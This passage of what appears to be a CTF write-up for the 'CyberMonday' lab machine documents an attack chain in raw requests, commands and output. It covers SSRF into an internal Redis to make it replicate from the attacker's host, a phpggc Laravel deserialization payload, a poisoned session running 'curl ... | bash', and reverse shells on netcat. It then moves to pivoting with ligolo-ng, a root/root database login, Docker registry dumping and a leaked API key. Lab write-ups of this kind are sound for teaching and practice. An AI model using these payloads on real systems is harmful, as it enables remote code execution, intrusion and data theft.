User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Connection: close
Content-Type: application/json
Content-Length: 67

{"url":"http://10.10.16.7", "method":"GET", "action":"sendRequest"}
```

```c
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 08:32:17 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=b6ff4fe84f7951a5be5e54915fc48ed1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 5028

{"status":"success","message":"URL is live","response":"<!DOCTYPE HTML><--- SNIP --->"}
```

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Connection: close
Content-Type: application/json
Content-Length: 68

{"url":"http://172.17.0.1", "method":"GET",  "action":"sendRequest"}
```

```c
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 08:34:46 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=01c50be06daefbf63f0ba8c6d25175a5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{"status":"success","message":"URL is live","response":"<html>\r\n<head><title>301 Moved Permanently<\/title><\/head>\r\n<body>\r\n<center><h1>301 Moved Permanently<\/h1><\/center>\r\n<hr><center>nginx\/1.25.1<\/center>\r\n<\/body>\r\n<\/html>\r\n"}
```

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Connection: close
Content-Type: application/json
Content-Length: 70

{"url":"http://redis:6379","method":"slaveof 10.10.16.7 6379\r\n\r\n"}
```

```c
HTTP/1.1 400 Bad Request
Server: nginx/1.25.1
Date: Tue, 22 Aug 2023 08:37:04 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=c6c63aeb15410c6ffd21e3f3f3179849; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 46

{"status":"error","message":"URL is not live"}
```

```c
$ nc -lnvp 6379
listening on [any] 6379 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.114.229] 41034
*1
$4
PING
```

To bring the website back fully functional, Yeeb found the following payload.

```c
{"url":"http://redis:6379","method":"slaveof no one\r\n\r\n"}
````

## PHP Deserialization

> https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/

> https://mogwailabs.de/en/blog/2022/08/exploiting-laravel-based-applications-with-leaked-app_keys-and-queues/

> https://github.com/ambionics/phpggc

```c
$ ./phpggc Laravel/RCE10 system '/bin/bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'
PHP Deprecated:  Creation of dynamic property Illuminate\Auth\RequestGuard::$callback is deprecated in /home/user/opt/payloads/phpggc/gadgetchains/Laravel/RCE/10/gadgets.php on line 20
PHP Deprecated:  Creation of dynamic property Illuminate\Auth\RequestGuard::$request is deprecated in /home/user/opt/payloads/phpggc/gadgetchains/Laravel/RCE/10/gadgets.php on line 21
PHP Deprecated:  Creation of dynamic property Illuminate\Auth\RequestGuard::$provider is deprecated in /home/user/opt/payloads/phpggc/gadgetchains/Laravel/RCE/10/gadgets.php on line 22
PHP Deprecated:  Creation of dynamic property Illuminate\Validation\Rules\RequiredIf::$condition is deprecated in /home/user/opt/payloads/phpggc/gadgetchains/Laravel/RCE/10/gadgets.php on line 9
O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:45:"/bin/bash -i >& /dev/tcp/10.10.16.7/9001 0>&1";}i:1;s:4:"user";}}
```

### Rogue Redis Server

> https://raw.githubusercontent.com/redis/redis/7.0/redis.conf

We modified the following parameters.

```c
replica-read-only no
protected-mode no
bind * -::*
```

```c
$ redis-server redis.conf
12267:C 22 Aug 2023 12:35:00.600 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
12267:C 22 Aug 2023 12:35:00.600 # Redis version=7.0.12, bits=64, commit=00000000, modified=0, pid=12267, just started
12267:C 22 Aug 2023 12:35:00.600 # Configuration loaded
12267:M 22 Aug 2023 12:35:00.601 * Increased maximum number of open files to 10032 (it was originally set to 1024).
12267:M 22 Aug 2023 12:35:00.601 * monotonic clock: POSIX clock_gettime
                _._                                                  
           _.-``__ ''-._                                             
      _.-``    `.  `_.  ''-._           Redis 7.0.12 (00000000/0) 64 bit
  .-`` .-```.  ```\/    _.,_ ''-._                                  
 (    '      ,       .-`  | `,    )     Running in standalone mode
 |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
 |    `-._   `._    /     _.-'    |     PID: 12267
  `-._    `-._  `-./  _.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |           https://redis.io       
  `-._    `-._`-.__.-'_.-'    _.-'                                   
 |`-._`-._    `-.__.-'    _.-'_.-'|                                  
 |    `-._`-._        _.-'_.-'    |                                  
  `-._    `-._`-.__.-'_.-'    _.-'                                   
      `-._    `-.__.-'    _.-'                                       
          `-._        _.-'                                           
              `-.__.-'                                               

12267:M 22 Aug 2023 12:35:00.603 # Server initialized
12267:M 22 Aug 2023 12:35:00.603 # WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
12267:M 22 Aug 2023 12:35:00.606 * Ready to accept connections
```

Then we pointed the server to our local `rogue redis instance`.

Modified Request:

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=993777cb4cdea1da7ea8475d82708ba5
Connection: close
Content-Type: application/json
x-access-token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Content-Length: 70

{"url":"http://redis:6379","method":"slaveof 10.10.16.7 6379\r\n\r\n"}
```

```c
12267:M 22 Aug 2023 12:35:35.320 * Replica 10.129.114.229:6379 asks for synchronization
12267:M 22 Aug 2023 12:35:35.320 * Partial resynchronization not accepted: Replication ID mismatch (Replica asked for '4bfaaf17f8c915f64ceefdb93b440011f37ff0f7', my replication IDs are 'b0543234f7db6e56acbc1106ad913c59d0fe44e0' and '0000000000000000000000000000000000000000')
12267:M 22 Aug 2023 12:35:35.320 * Replication backlog created, my new replication IDs are '1b07720b06cb5321bda704ab0b49881b3b059172' and '0000000000000000000000000000000000000000'
12267:M 22 Aug 2023 12:35:35.320 * Delay next BGSAVE for diskless SYNC
12267:M 22 Aug 2023 12:35:40.845 * Starting BGSAVE for SYNC with target: replicas sockets
12267:M 22 Aug 2023 12:35:40.846 * Background RDB transfer started by pid 12606
12606:C 22 Aug 2023 12:35:40.850 * Fork CoW for RDB: current 0 MB, peak 0 MB, average 0 MB
12267:M 22 Aug 2023 12:35:40.850 # Diskless rdb transfer, done reading from pipe, 1 replicas still up.
12267:M 22 Aug 2023 12:35:40.947 * Background RDB transfer terminated with success
12267:M 22 Aug 2023 12:35:40.947 * Streamed RDB transfer with replica 10.129.114.229:6379 succeeded (socket). Waiting for REPLCONF ACK from slave to enable streaming
12267:M 22 Aug 2023 12:35:40.947 * Synchronization with replica 10.129.114.229:6379 succeeded
```

Modified Request:

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=993777cb4cdea1da7ea8475d82708ba5
Connection: close
Content-Type: application/json
x-access-token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Content-Length: 78

{"url":"http://redis:6379","method":"CONFIG SET replica-read-only no\r\n\r\n"}
```

Modified Request:

```c
POST /webhooks/1488ec22-b5e5-4324-aa8d-11df0e2d390c HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=993777cb4cdea1da7ea8475d82708ba5
Connection: close
Content-Type: application/json
x-access-token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJ5ZWViIiwicm9sZSI6ImFkbWluIn0.1pV2tIi7wh9SbFZYNwvFSDUQTL3C7tkcgOX_p7FovcA
Content-Length: 181

{
"url":"http://redis:6379/",
"method":"EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.16.7\",\"6379\",v,0,200) end' 0\r\n*1\r\n$20\r\n"
}
```

```c
$ redis-cli 
127.0.0.1:6379>
```

```c
127.0.0.1:6379> INFO keyspace
# Keyspace
db0:keys=1,expires=1,avg_ttl=6999833
```

```c
127.0.0.1:6379> KEYS *
1) "laravel_session:TTkbnCUFgtSjgGAB1oY5xOmMBtV1LjKDgcLSwCS7"
```

```c
$ cat sh.sh 
sh -i >& /dev/tcp/10.10.16.7/9001 0>&1
```

Payload:

```c
SET "laravel_session:TTkbnCUFgtSjgGAB1oY5xOmMBtV1LjKDgcLSwCS7" 'O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:35:"curl http://10.10.16.7/sh.sh | bash";}i:1;s:4:"user";}}'
```

```c
127.0.0.1:6379> SET "laravel_session:TTkbnCUFgtSjgGAB1oY5xOmMBtV1LjKDgcLSwCS7" 'O:38:"Illuminate\Validation\Rules\RequiredIf":1:{s:9:"condition";a:2:{i:0;O:28:"Illuminate\Auth\RequestGuard":3:{s:8:"callback";s:14:"call_user_func";s:7:"request";s:6:"system";s:8:"provider";s:35:"curl http://10.10.16.7/sh.sh | bash";}i:1;s:4:"user";}}'
OK
```

Then we reload the website `http://cybermonday.htb/` to trigger the payload.

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.114.229 - - [22/Aug/2023 12:57:24] "GET /sh.sh HTTP/1.1" 200 -
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.114.229] 38618
sh: 0: can't access tty; job control turned off
$
```

## Enumeration

```c
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```c
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

## Stabilizing Shell

```c
$ script -q /dev/null -c bash
```

## Pivoting

```c
www-data@070370e2cdc4:/mnt$ ls -la
ls -la
total 40
drwxr-xr-x 5 1000 1000 4096 Aug  3 09:51 .
drwxr-xr-x 1 root root 4096 Jul  3 05:00 ..
lrwxrwxrwx 1 root root    9 Jun  4 02:07 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 May 29 15:12 .bash_logout
-rw-r--r-- 1 1000 1000 3526 May 29 15:12 .bashrc
drwxr-xr-x 3 1000 1000 4096 Aug  3 09:51 .local
-rw-r--r-- 1 1000 1000  807 May 29 15:12 .profile
drwxr-xr-x 2 1000 1000 4096 Aug  3 09:51 .ssh
-rw-r--r-- 1 root root  701 May 29 23:26 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3 09:51 logs
-rw-r----- 1 root 1000   33 Aug 22 14:45 user.txt
```

```c
www-data@070370e2cdc4:/mnt/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufnXgnIZGcV4pdk94RHW9DExKFNo7iEvAnjMFnyqzGOJQZ623wqvm2WS577WlLFYTGVe4gVkV2LJm8NISndp9DG9l1y62o1qpXkIkYCsP0p87zcQ5MPiXhhVmBR3XsOd9MqtZ6uqRiALj00qGDAc+hlfeSRFo3epHrcwVxAd41vCU8uQiAtJYpFe5l6xw1VGtaLmDeyektJ7QM0ayUHi0dlxcD8rLX+Btnq/xzuoRzXOpxfJEMm93g+tk3sagCkkfYgUEHp6YimLUqgDNNjIcgEpnoefR2XZ8EuLU+G/4aSNgd03+q0gqsnrzX3Syc5eWYyC4wZ93f++EePHoPkObppZS597JiWMgQYqxylmNgNqxu/1mPrdjterYjQ26PmjJlfex6/BaJWTKvJeHAemqi57VkcwCkBA9gRkHi9SLVhFlqJnesFBcgrgLDeG7lzLMseHHGjtb113KB0NXm49rEJKe6ML6exDucGHyHZKV9zgzN9uY4ntp2T86uTFWSq4U2VqLYgg6YjEFsthqDTYLtzHer/8smFqF6gbhsj7cudrWap/Dm88DDa3RW3NBvqwHS6E9mJNYlNtjiTXyV2TNo9TEKchSoIncOxocQv0wcrxoxSjJx7lag9F13xUr/h6nzypKr5C8GGU+pCu70MieA8E23lWtw== john@cybermonday
```

| Username |
| --- |
| john |

## Port Forwarding with ligolo-ng

> https://github.com/0xsyr0/OSCP#ligolo-ng

```c
www-data@070370e2cdc4:~/html/public$ curl db -vvv
curl db -vvv
*   Trying 172.18.0.6:80...
* connect to 172.18.0.6 port 80 failed: Connection refused
* Failed to connect to db port 80 after 2 ms: Couldn't connect to server
* Closing connection 0
curl: (7) Failed to connect to db port 80 after 2 ms: Couldn't connect to server
```

```c
$ ./proxy -laddr 10.10.16.7:443 -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 10.10.16.7:443                  
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                                                                                                                           
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                                                                                                                           
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                                                                                                                            
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                                                                                                                             
        /____/                          /____/                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Made in France ♥ by @Nicocha30!                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
ligolo-ng »
```

```c
$ curl http://10.10.16.7/agent -o agent
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 4396k  100 4396k    0     0  1534k      0  0:00:02  0:00:02 --:--:-- 1534k
```

```c
$ chmod +x agent
```

```c
$ ./agent -connect 10.10.16.7:443 -ignore-cert
time="2023-08-22T15:34:54Z" level=warning msg="warning, certificate validation disabled"
time="2023-08-22T15:34:54Z" level=info msg="Connection established" addr="10.10.16.7:443"
```

```c
ligolo-ng » INFO[0022] Agent joined.                                 name=www-data@070370e2cdc4 remote="10.129.114.229:59478"
ligolo-ng » session
? Specify a session : 1 - www-data@070370e2cdc4 - 10.129.114.229:59478
[Agent : www-data@070370e2cdc4] » ifconfig
┌────────────────────────────┐
│ Interface 0                │
├──────────────┬─────────────┤
│ Name         │ lo          │
│ Hardware MAC │             │
│ MTU          │ 65536       │
│ Flags        │ up|loopback │
│ IPv4 Address │ 127.0.0.1/8 │
└──────────────┴─────────────┘
┌───────────────────────────────────────┐
│ Interface 1                           │
├──────────────┬────────────────────────┤
│ Name         │ eth0                   │
│ Hardware MAC │ 02:42:ac:12:00:07      │
│ MTU          │ 1500                   │
│ Flags        │ up|broadcast|multicast │
│ IPv4 Address │ 172.18.0.7/16          │
└──────────────┴────────────────────────┘
```

```c
$ sudo ip r add 172.18.0.0/16 dev ligolo
```

```c
[Agent : www-data@070370e2cdc4] » start
[Agent : www-data@070370e2cdc4] » INFO[0364] Starting tunnel to www-data@070370e2cdc4
```

```c
$ mysql -h 172.18.0.6 -P 3306 -u root -proot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 8.0.33 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

```c
MySQL [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| cybermonday        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webhooks_api       |
+--------------------+
6 rows in set (0.202 sec)
```

```c
MySQL [(none)]> USE cybermonday;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
MySQL [cybermonday]> SHOW tables;
+------------------------+
| Tables_in_cybermonday  |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| products               |
| users                  |
+------------------------+
6 rows in set (0.223 sec)
```

Since this was a dead end, we headed back to the `Docker Registry`.

## Docker Registry

```c
$ python3 DockerGraber.py 'http://172.18.0.2' --list
/home/user/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[+]======================================================[+]
[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

[+] cybermonday_api
```

```c
$ python3 DockerGraber.py 'http://172.18.0.2' --dump cybermonday_api
/home/user/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[+]======================================================[+]
[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

[+] BlobSum found 27
[+] Dumping cybermonday_api
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce
    [+] Downloading : ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1
    [+] Downloading : 1696d1b2f2c3c8b37ae902dfd60316f8928a31ff8a5ed0a2f9bbf255354bdee8
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 57cdb531a15a172818ddf3eea38797a2f5c4547a302b65ab663bac6fc7ec4d4f
    [+] Downloading : 4756652e14e0fb6403c377eb87fd1ef557abc7864bf93bf7c25e19f91183ce2c
    [+] Downloading : 5c3b6a1cbf5455e10e134d1c129041d12a8364dac18a42cf6333f8fee4762f33
    [+] Downloading : 9f5fbfd5edfcaf76c951d4c46a27560120a1cd6a172bf291a7ee5c2b42afddeb
    [+] Downloading : 57fbc4474c06c29a50381676075d9ee5e8dca9fee0821045d0740a5bc572ec95
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : dc968f4da64f18861801f2c677d2460c4cc530f2e64232f1a23021a9760ffdae
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 1684de57270ea8328d20b9d17cda5091ec9de632dbba9622cce10b82c2b20e62
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : affe9439d2a25f35605a4fe59d9de9e65ba27de2403820981b091ce366b6ce70
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 5b5fe70539cd6989aa19f25826309f9715a9489cf1c057982d6a84c1ad8975c7
```

```c
$ mkdir cybermonday_api;for f in $(ls|grep '.tar.gz');do tar -xzf $f -C cybermonday_api;done
```

```c
$ ll
total 193876
-rw-r--r--  1 user user 104338947 Aug 22 16:20 1684de57270ea8328d20b9d17cda5091ec9de632dbba9622cce10b82c2b20e62.tar.gz
-rw-r--r--  1 user user  15628215 Aug 22 16:18 1696d1b2f2c3c8b37ae902dfd60316f8928a31ff8a5ed0a2f9bbf255354bdee8.tar.gz
-rw-r--r--  1 user user      2449 Aug 22 16:18 4756652e14e0fb6403c377eb87fd1ef557abc7864bf93bf7c25e19f91183ce2c.tar.gz
-rw-r--r--  1 user user       243 Aug 22 16:18 57cdb531a15a172818ddf3eea38797a2f5c4547a302b65ab663bac6fc7ec4d4f.tar.gz
-rw-r--r--  1 user user  12330754 Aug 22 16:19 57fbc4474c06c29a50381676075d9ee5e8dca9fee0821045d0740a5bc572ec95.tar.gz
-rw-r--r--  1 user user  29124744 Aug 22 16:20 5b5fe70539cd6989aa19f25826309f9715a9489cf1c057982d6a84c1ad8975c7.tar.gz
-rw-r--r--  1 user user  35889986 Aug 22 16:19 5c3b6a1cbf5455e10e134d1c129041d12a8364dac18a42cf6333f8fee4762f33.tar.gz
-rw-r--r--  1 user user       492 Aug 22 16:19 9f5fbfd5edfcaf76c951d4c46a27560120a1cd6a172bf291a7ee5c2b42afddeb.tar.gz
-rw-r--r--  1 user user        32 Aug 22 16:20 a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
-rw-r--r--  1 user user       224 Aug 22 16:20 affe9439d2a25f35605a4fe59d9de9e65ba27de2403820981b091ce366b6ce70.tar.gz
-rw-r--r--  1 user user    521882 Aug 22 16:18 beefd953abbcb2b603a98ef203b682f8c5f62af19835c01206693ad61aed63ce.tar.gz
-rw-r--r--  1 user user    118257 Aug 22 16:18 ca62759c06e1877153b3eab0b3b734d6072dd2e6f826698bf55aedf50c0959c1.tar.gz
-rw-r--r--  1 user user    521893 Aug 22 16:18 ced3ae14b696846cab74bd01a27a10cb22070c74451e8c0c1f3dcb79057bcc5e.tar.gz
drwxr-xr-x 17 user user      4096 Aug 22 16:21 cybermonday_api
-rw-r--r--  1 user user       269 Aug 22 16:19 dc968f4da64f18861801f2c677d2460c4cc530f2e64232f1a23021a9760ffdae.tar.gz
```

```c
$ cat helpers/Api.php 
<?php

namespace app\helpers;
use app\helpers\Request;

abstract class Api
{
    protected $data;
    protected $user;
    private $api_key;

    public function __construct()
    {
        $method = Request::method();
        if(!isset($_SERVER['CONTENT_TYPE']) && $method != "get" || $method != "get" && $_SERVER['CONTENT_TYPE'] != "application/json")
        {
            return http_response_code(404);
        }

        header('Content-type: application/json; charset=utf-8');
        $this->data = json_decode(file_get_contents("php://input"));
    }

    public function auth()
    {
        if(!isset($_SERVER["HTTP_X_ACCESS_TOKEN"]) || empty($_SERVER["HTTP_X_ACCESS_TOKEN"]))
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }

        $token = $_SERVER["HTTP_X_ACCESS_TOKEN"];
        $decoded = decodeToken($token);
        if(!$decoded)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    
        $this->user = $decoded;
    }

    public function apiKeyAuth()
    {
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function admin()
    {
        $this->auth();
        
        if($this->user->role != "admin")
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

    public function response(array $data, $status = 200) {
        http_response_code($status);
        die(json_encode($data));
    }
}
```

| API Key |
| --- |
| 22892e36-1770-11ee-be56-0242ac120002 |

## Foothold through Local File Inclusion (LFI)

```c
MySQL [webhooks_api]> select * from webhooks;
